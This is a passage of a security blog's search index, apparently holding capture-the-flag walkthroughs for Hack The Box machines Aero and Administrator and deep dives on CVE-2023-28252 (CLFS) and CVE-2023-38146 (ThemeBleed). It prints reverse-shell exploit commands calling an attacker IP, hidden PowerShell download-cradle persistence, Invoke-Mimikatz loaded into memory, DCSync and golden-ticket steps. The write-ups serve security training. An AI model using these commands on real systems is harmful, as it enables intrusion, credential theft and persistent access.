\u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Specifies the action that the task will execute. powershell.exe: Starts PowerShell. Arguments passed to powershell: -WindowStyle hidden: Runs the task in a hidden window to prevent showing the PowerShell window. NoLogo -NonInteractive -ep bypass -nop: PowerShell flags to suppress output and allow script execution bypassing restrictions. IEX ((New-Object Net.WebClient).DownloadString(...)): Uses Invoke-Expression to download and immediately execute the script. /sc minute /mo 1: Sets the task to run every 1 minute. /ru System: Runs the task under System privileges. Lessons Learned: What did I learn? This box was great as means to learn about the CVE\u0026rsquo;s in question. However what I enjoyed more was figuring out ways to achieve persistence with such little open on the host. With only port 80 being open creating a consistent means of re-entering the host was interesting to me and a good exercise Learning about the CVE\u0026rsquo;s CVE-2023-38146 \u0026amp; CVE-2023-28252 was very interesting. There is a great article here about CLFS vulnerability but it\u0026rsquo;s ALOT: https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability I wrote two deep dives to understand these attacks more. What silly mistakes did I make? Not a huge amount this time to be honest, which is fun. Might actually be improving. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/aero-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/clfs\/": {
        "title": "CLFS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/clfs\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2023-28252\/": {
        "title": "CVE-2023-28252",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2023-28252\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2023-38146\/": {
        "title": "CVE-2023-38146",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2023-38146\/"
    },
    
    "http:\/\/localhost:1313\/tags\/themebleed\/": {
        "title": "ThemeBleed",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/themebleed\/"
    },
    
    "http:\/\/localhost:1313\/articles\/understanding2023-28252-clfs\/": {
        "title": "Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability",
        "tags": ["Windows","Active Directory","CVE-2023-28252","CLFS",],
        "content": "Understanding CVE-2023-28252: A Deep Dive into CLFS Privilege Escalation CVE-2023-28252 represents a critical vulnerability in Microsoft\u0026rsquo;s Common Log File System (CLFS) that allows local privilege escalation to SYSTEM.\nWhat is CLFS? The Common Log File System (CLFS) is a logging subsystem introduced in Windows Server 2003 R2. Unlike traditional logging systems, CLFS provides:\nComponent Overview CLFS Architecture: ├── Log Container │ ├── Base Log File (.blf) │ └── Container Files (.clf) ├── Stream Management │ ├── Virtual Log Files │ └── Log Blocks └── Client Interface ├── User Mode API └── Kernel Mode API Key Features Transactional logging with ACID properties High-performance sequential I/O operations Crash recovery capabilities Structured storage for log records Technical Deep Dive Vulnerability Details The vulnerability exists in the CLFS driver (CLFS.SYS) and involves:\nMemory allocation issues in the CLFS driver Improper validation of user-controlled input Potential for heap corruption leading to privilege escalation Real-World Exploitation Example This was performed on the hack the box machine Aero: https://app.hackthebox.com/machines/Aero Available Proof of Concept A pre-compiled exploit is available at:\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe Note: This exploit allows passing another binary as an argument for privileged execution Initial Setup and Exploitation After discovering the target is vulnerable to CVE-2023-28252, we locate a suitable pre-compiled exploit:\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe Note: This exploit allows us to pass another binary as an argument, which is ideal for obtaining a reverse shell as NT/Authority\nClone the Exploit:\ngit clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git Transfer Required Files to Target: First, transfer the exploit:\nwget http://10.10.14.121:9000/exploit.exe -o ex.exe Then, transfer netcat for the reverse shell:\nwget http://10.10.14.121:9000/nc64.exe -o nc64.exe Setup Reverse Shell Listener: On the attack machine:\nrlwrap -cAr nc -nvlp 443 Execute Exploit: Trigger the exploit with netcat as the payload:\n.\\ex.exe 1208 1 \u0026#34;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 443 -e cmd\u0026#34; Command breakdown: .\\ex.exe: The compiled exploit executable 1208: Process ID to target 1: Execution mode flag Netcat parameters: 10.10.14.121: Attacker\u0026rsquo;s IP address 443: Port to connect back to -e cmd: Execute cmd.exe and bind it to the connection Confirm Privilege Escalation: Successfully receive NT/Authority SYSTEM shell:\nImpact Analysis Affected Systems Matrix: Windows Version Architecture Vulnerable Server 2022 x64 Yes Server 2019 x64 Yes Windows 11 x64 Yes Windows 10 x64 Yes Detection and Prevention: Mitigation Strategies: System Updates:\nApply latest Windows security updates Enable automatic updates Access Controls:\nImplement principle of least privilege Monitor and restrict access to CLFS-related operations System Monitoring:\nMonitor for suspicious CLFS operations Track privilege escalation attempts References: Microsoft Security Advisory CVE-2023-28252 Details (NVD) Bleeping Computer Analysis Duck-Sec\u0026rsquo;s POC Repository Rapid7\u0026rsquo;s For a very deep dive Fortra.com ", 
        "url": "http:\/\/localhost:1313\/articles\/understanding2023-28252-clfs\/"
    },
    
    "http:\/\/localhost:1313\/articles\/understandingthemebleedcve-2023-38146\/": {
        "title": "Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability",
        "tags": ["Windows","Active Directory","CVE-2023-38146","ThemeBleed",],
        "content": "Understanding CVE-2023-38146: ThemeBleed Windows Vulnerability: ThemeBleed (CVE-2023-38146) represents a critical vulnerability in Windows Theme Feature that allows local privilege escalation through improper handling of theme binary data.\nWhat is ThemeBleed? ThemeBleed is a security vulnerability in the Windows Theme Binary Data feature where improper handling of theme files can lead to:\nLocal privilege escalation Arbitrary file read Potential system compromise Technical Deep Dive: Component Overview: The vulnerability exists in several key Windows components:\nAffected Components: ├── Theme Binary Data Parser │ ├── Handles .THEME and .MSSTYLES files │ └── Responsible for version validation ├── Windows Theme Service │ ├── Loads theme resources │ └── Manages DLL verification └── Desktop Window Manager ├── Applies visual themes └── Executes theme components Discovery Background: Security researcher Will Kirkpatrick discovered this vulnerability while investigating uncommon Windows file formats, specifically focusing on the .THEME format used for Windows visual customization.\nVulnerability Details: The vulnerability involves several key components:\nTheme Components: ├── .THEME files │ └── Contains appearance settings ├── .MSSTYLES files │ ├── Should only contain graphical resources │ └── No executable code intended └── Version handling ├── Special \u0026#34;999\u0026#34; version number └── Improper DLL validation Race Condition Exploitation: The core issue lies in the handling of .MSSTYLES files when a specific version number (999) is used:\nInitial DLL Verification:\nSystem checks \u0026ldquo;_vrf.dll\u0026rdquo; signature Validates file integrity Race Window:\nTime gap between verification and loading Allows DLL replacement Original verification becomes invalid Exploitation:\nMalicious DLL can be substituted System loads replaced DLL Arbitrary code execution achieved Distribution Vector: The vulnerability has two interesting distribution aspects:\nDirect Theme Files:\nDownloads trigger mark-of-the-web warnings Users receive security prompts Some protection provided THEMEPACK Bypass:\n.THEMEPACK files are CAB archives Automatically extract and apply themes Bypass mark-of-the-web protection No security warnings shown Real-World Exploitation Example: This was performed on the hack the box machine Aero: https://app.hackthebox.com/machines/Aero Available Proof of Concept: A public POC for the ThemeBleed exploit is available at:\nhttps://github.com/Jnnshschl/CVE-2023-38146 The creator has also written a blog-post to accompany the POC. +Note+: There are multiple POC\u0026rsquo;s however this is just my preffered one. Exploitation Process Payload Preparation:\nCreate malicious DLL containing reverse shell code Configure connection parameters (IP, port) Compile in Release mode for target architecture Exploit Setup:\nDirectory Structure: └── exploit_root/ ├── tb/ │ └── Aero.msstyles_vrf_evil.dll # Our compiled reverse shell DLL that gains SYSTEM │ └── Aero.msstyles # Modified theme file that triggers the exploit │ └── Aero.msstyles_vrf.dll # Legitimate Microsoft-signed DLL we race against └── themebleed.py # Python script that orchestrates the attack Execution Flow: Attacker starts listener on control server Exploit script triggers theme loading Race condition allows DLL substitution Reverse shell connects to attacker Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL: The exploit requires a reverse shell DLL. A POC for this is available at:\nhttps://github.com/Jnnshschl/ThemeBleedReverseShellDLL Development Environment Setup\nWindows 10 VM (my preffered version is setup using Mandiant Commando script ) Visual Studio +(not Visual Studio Code+) Building Process\nOpen Visual Studio and clone the repo:\nConfigure attack parameters:\nLocate main.cpp Set attack IP and port (lines 32/34) Set \u0026ldquo;autoReconnect\u0026rdquo; to false Prepare for compilation:\nSet to release mode Build the solution: +Note+: \u0026ldquo;Building the solution\u0026rdquo; means compiling the exploit Locate the compiled DLL at: C:\\Users\\[YourUserName]\\source\\repos\\ThemeBleedReverseShellDLL\\x64\\Release\\ThemeBleeedReverseShell.dll Executing the Exploit Clone the main exploit repository: git clone https://github.com/Jnnshschl/CVE-2023-38146.git\nPrepare the payload:\nMove ThemeBleeedReverseShell.dll to the tb folder Rename it to Aero.msstyles_vrf_evil.dll +Note+: The repository mentions td folder but it\u0026rsquo;s actually tb\nStart the listener: rlwrap -cAr nc -nvlp 4711\nExecute the exploit: python3 themebleed.py -r [MYAttackMachine] --no-dll\nReceive the connection:\nImpact Analysis: Affected Systems: Windows Version Architecture Vulnerable Windows 11 x64 Yes Windows 10 x64 Yes Server 2019 x64 Yes Server 2022 x64 Yes Security Implications: The vulnerability can lead to:\nLocal privilege escalation System compromise Unauthorized file access Mitigation: Mitigation Strategies System Updates:\nApply latest Windows security updates Enable automatic updates Access Controls:\n# PowerShell: Restrict theme directory access $acl = Get-Acl \u0026#34;C:\\Windows\\Resources\\Themes\u0026#34; $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( \u0026#34;Users\u0026#34;,\u0026#34;Read\u0026#34;,\u0026#34;Allow\u0026#34;) $acl.SetAccessRule($rule) Set-Acl \u0026#34;C:\\Windows\\Resources\\Themes\u0026#34; $acl Group Policy Settings: Disable theme changes for standard users Restrict access to theme directories Prevention Best Practices System Hardening:\nImplement principle of least privilege Regular security updates Monitor theme-related activities Security Controls:\nApplication control policies User access restrictions System monitoring Block .THEMEPACK files at network edge Monitor DLL loading during theme changes References Microsoft Security Advisory CVE-2023-38146 Details Bleeping Computer Will Kirkpatrick\u0026rsquo;s Technical Analysis ", 
        "url": "http:\/\/localhost:1313\/articles\/understandingthemebleedcve-2023-38146\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/administrator-box\/": {
        "title": "Administrator HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","Active Directory","Kerberos","Kerberoasting","DACLS","ACL","pwsafe","Download Cradle","AS-REPRoasting",],
        "content": "Administrator Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Administrator How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Assumed Breach Box: This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials. This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today. +Note+: Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them. This ensures I don’t overlook any findings just because access is available. Comprehensive documentation of all discoveries remains essential. NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Administrator/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:31:11 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 07:31 GMT Nmap scan report for 10.129.160.121 Host is up (0.038s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 3.65 seconds Initial thoughts: FTP DNS SMB RPC LDAP Kerberos Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Administrator/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:32:32 zsh ✖ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 07:33 GMT Nmap scan report for 10.129.160.121 Host is up (0.037s latency). Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-10 14:34:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 51257/tcp open msrpc Microsoft Windows RPC 57547/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 57552/tcp open msrpc Microsoft Windows RPC 57563/tcp open msrpc Microsoft Windows RPC 57574/tcp open msrpc Microsoft Windows RPC 57607/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=11/10%OT=21%CT=1%CU=31464%PV=Y%DS=2%DC=I%G=Y%TM=673 OS:0623B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6 OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD= OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0% OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h00m01s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-10T14:35:18 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\n🕙 07:33:20 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.160.121 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.160.121 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=administrator,DC=htb CN=Configuration,DC=administrator,DC=htb CN=Schema,CN=Configuration,DC=administrator,DC=htb DC=DomainDnsZones,DC=administrator,DC=htb DC=ForestDnsZones,DC=administrator,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=administrator,DC=htb The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name: Again we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=administrator,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;administrator.htb\u0026quot; update_var machine \u0026quot;DC\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. +Note+: The timestamps for this will be strange (if you look at those) due to having an issue with DNS for a while. It suddenly resolve. Kerberos 88: Using netexec for Kerberoasting: As we have creds we can kerberoast: netexec ldap $box -u $user -p $pass --kerberoast kerb.txt None Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win: netexec ldap $box -u $user -p $pass --asreproast asrep.txt Nothing: RPC: As we have valid credentials we can also connect to RPC to enumerate further: rpcclient -U $user $box Enumerating domain users via RPC: Enumerating users using rpc: enumdomusers I add all these users to my users list. Querying inidividual users: queryuser [RID] I query each user in the event that there is anything useful in the description field but there isn\u0026rsquo;t. FTP 21: I connect to FTP and try \u0026amp; authenticate as Olivia but she does not have access:\nftp $box I also check as anonymous but no luck:\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Both NULL \u0026amp; Guest sessions have been disabled. Attempting to connect as Olivia: I connect as Olivia and she has access to IPC$, NETLOGON \u0026amp; SYSVOL, SYSVOL can be interesting as sometimes it can contain shares: netexec smb $box -u $user -p $pass --shares Using smbclient: I connect to SYSVOL: smbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; Nothing immediately jumps out lets table this. 2. Lateral Movement: Running a BloodHound Collection: As we have credentials we can run bloodhound collection bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box Discovering an attack chain for lateral movement in bloodhound: Looking at our bloodhound results we can see that Olivia has GenericAll rights over Michael which allows alot of potentially attack paths for us:\nWe can perform a Targeted Kerberoasting Attack, Force Change their Password or a Shadow Credentials attack (these are just a few options.) We just need to look at the edge in bloodhound: Michael in turn has the ForceChangePassword privilege over Benjamin:\nThis means if we can control Michael we can then change Benjamin\u0026rsquo;s password Benjamin is a member of the Share Moderators group:\nSo far I am unsure of what specifically this will grant us just yet but it seems like something interesting to go after. Performing a targeted kerberoasting attack on Michael: I perform am going to perform a targeted kerberoast attack on michael from olivia\u0026rsquo;s account. This way we can extract a hash for cracking.\nClone the repo:\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git Perform our attack:\npython3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user michael -o michael.kerb Attempting to crack Michael\u0026rsquo;s password with hashcat: Now we have Michael\u0026rsquo;s kerberos ticket lets attempt to crack it with hashcat to export his clear text password: hashcat -m 13100 michael.kerb /home/kali/Wordlists/rockyou.txt -O It does not crack. Attempting to add Michael Directly to the Share Operators group: As we have GenericAll over Michael we should be able to give him group access: (this is incorrect see my notes) net rpc group addmem \u0026quot;share moderators\u0026quot; \u0026quot;michael\u0026quot; -U $domain/$user%$pass -S $box +Note+: This is not possible as we do not have write privileges over the group. For some reason I was convinced at the time this was a viable approach. Changing Michaels Password: Our options at the start were to perform a targeted kerberoasting attack, which we performed but could not extract the hash. The other option is a shadow credentials attack however we cannot perform this as there is no CA \u0026amp; so now we move onto changing Michaels password. Changing a user’s password is typically a last resort in an engagement, as it can disrupt the user\u0026rsquo;s work and may fall outside the approved scope. This is why I left this until last\nLets set the our new password\nnewPass=bl00dst1ll3r! net rpc password \u0026quot;Michael\u0026quot; $newPass -U $domain/$user%$pass -S $box +Note+: There is no output from this so we need to verify it worked Verify it works:\nnetexec smb $box -u $user -p $newPass --shares Enumerating as Michael: I check FTP access:\nStill no access. We can login via evil-winrm:\nI will come back to this as I want to proceed with the benjamin password change. +Note+: The user flag is not on the users desktop. I discover there are 3 users with access to the host:\nThis is useful as if we extract more creds later this can help direct our attack. Changing Benjamins Password: We repeat the process we did before for Michael but for Benjamin.\nSet our password\nnet rpc password \u0026quot;Benjamin\u0026quot; $newPass -U $domain/$user%$newPass -S $box +Note+: There is no output from this so we need to verify it worked Verify it works:\nnetexec smb $box -u benjamin -p $newPass --shares Benjamin does not have win-rm access:\nAccessing FTP as Benjamin: I check if benjamin has access to ftp \u0026amp; he does\nBenjamin has access to FTP:\nFinding a password safe file in the FTP: There is a file called Backup.psafe3\nI download the file to my local attach machine:\nThere is an error as we are downloading in ascii mode, if we switch to binary mode we should be able to remove this warning. I switch to binary mode \u0026amp; re-download to be sure:\nLooking online we discover the format psafe3 is used by the password manager \u0026ldquo;Password Safe\u0026rdquo;:\nhttps://www.pwsafe.org/ Cracking the pwsafe File with John: John the ripper has a module for pwsafe files pwsafe2john I run this to extract the hash:\npwsafe2john Backup.psafe3 \u0026gt; pwsafehash Crack with john:\njohn pwsafehash --wordlist=/home/kali/Wordlists/rockyou.txt Retrieving passwords from the pswafe file: So we can open this we need to install password safe:\n# get release wget https://github.com/pwsafe/pwsafe/releases/download/1.20.0/passwordsafe-debian12-1.20-amd64.deb # make exectuable chmod +x passwordsafe-debian12-1.20-amd64.deb #install sudo apt install ~/Downloads/passwordsafe-debian12-1.20-amd64.deb Load up the file Backup.psafe3:\nI entered the cracked password too. When it opens we see the following entries:\nI click \u0026ldquo;Edit Entry\u0026rdquo; on each entry to expand it and see notes:\nI do this as sometimes additional information will be stored here which can be useful but there is nothing in this case. I retrieve all 3 users passwords:\nAlexander, Emily \u0026amp; Emma. I am especially interested in Emily as she is another user on the host. 3. Privilege Escalation: Accessing the host as emily: As we saw earlier that emily has access to the host connect using her credentials:\nevil-winrm -i $box -u $user -p $pass Grab the user flag:\nDiscovering Emily has GenericWrite privileges over Ethan in bloodhound: Emily has GenericWrite over Ethan:\nLooking in bloodhound we can see emily has GenericWrite over Ethan Ethan has DC-Sync Rights over the root domain object:\nThis means if we can control ethan we can then perform a DC-Sync attack and extract all creds. Performing a targeted kerberoasting attack on Ethan: Looking at the GenericWrite edge in bloodhound we can see that a targeted kerberoasting attack is a viable option:\nPerform our attack:\nAs we already have targetedKerberoast downloaded from earlier we can use that. python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ethan -o ethan.kerb We succesfully perform the attack Cracking the Ethan\u0026rsquo;s Kerberos hash with hashcat: Cracking ethans kerberos has with hashcat:\nhashcat -m 13100 ethan.kerb /home/kali/Wordlists/rockyou.txt -O It cracks We Verify his creds work:\nnetexec smb $box -u $user -p $pass --shares Performing a DCSync Attack with impacket-secretsdump: As ethan has DC-Sync privileges we can perform a DC-Sync attack now.\nPerforming the DC-Sync attack as Ethan:\nimpacket-secretsdump $domain/$user:$pass@$box Getting our root flag via evil-winrm and PTH:\n4. Persistence: Trying to create a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain +Note+: This error occurs because protections are in place that prevent ticket creation using NT hashes or RC4 encryption. Instead, we need to create a Golden Ticket using the AES hash of the KRBTGT account. Using a download Cradle to load invoke-mimikatz into memory: Initially I tried to generate a ticket just using the KRBTGT NT hash however this was revoked (expected) however we can get around this by extracting the AESKEY using mimikatz and extracting a creating a ticket\nTo avoid AMSI I decide to use invoke-mimikatz this means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.\n+Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ I stand up my python server:\npython3 -m http.server 9000 +Note+: I have the above command aliased to pws for ease on my machine. On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory: iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mimikatz.ps1') +Note+: This will hang for a little bit, so just be patient. Using invoke-mimikatz to perform a targeted DC-Sync attack to extract the KRBTGT AES hash: Lets perform a DC-SYNC attack targeting the krbtgt user and extract their aes hash: Invoke-Mimikatz -Command '\u0026quot;privilege::debug\u0026quot; \u0026quot;lsadump::dcsync /user:krbtgt /domain:administrator.htb\u0026quot;' +Note+: We already have the this AES hash from secretsdump but I wanted to demo how it can extracted using invoke-mimikatz/mimikatz \u0026amp; a download cradle. Creating our golden-ticket using impacket-ticketer: We can now create our ticket:\nimpacket-ticketer -aesKey $aesKey -domain-sid $sid -domain $domain administrator Load into memory:\nexport KRB5CCNAME=./administrator.ccache Connecting via PSEXEC with our golden-ticket: Access the host: impacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target’s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the KRBTGT account, not individual users. 5. Beyond Root: There is an alternative way to own Ethan after we have control Emily.\nAs we have GenericWrite over Ethan we can set the DONT_REQ_PREAUTH flag (setting to be to true) on his account to enable us to perform an AS-REP roasting attack on his account to retrieve a hash to crack.\nThis attack can be with powerview or the inbuilt Active Directory PowerShell Module, I will show you with both.\nFirst lets verify that the 